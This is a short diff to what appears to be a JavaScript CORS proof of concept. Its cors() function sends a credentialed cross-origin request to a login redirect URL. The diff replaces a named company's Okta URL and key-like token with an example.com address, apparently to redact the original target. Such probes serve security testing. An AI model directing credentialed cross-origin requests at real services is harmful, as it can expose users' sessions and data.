@@ -9,7 +9,7 @@ var invocation = new XMLHttpRequest();
 
 function cors(){
   if(invocation) {
-    invocation.open('GET', "https://fireeye.okta.com/login/login.htm?fromURI=/oauth2/v1/authorize/redirect?okta_key=2CvpDHH5lg1PdBaxc5qW-5a6-ruqeqSrKrY8dxCC03",);
+    invocation.open('GET', "https://example.com/login/login.htm?fromURI=/oauth2/v1/authorize/redirect?_key=2CvpDHH5lg1PdBaxc5qW-5a6-ruqeqSrKrY8dxCC03",);
     invocation.withCredentials = true;
     invocation.send(); 
   }
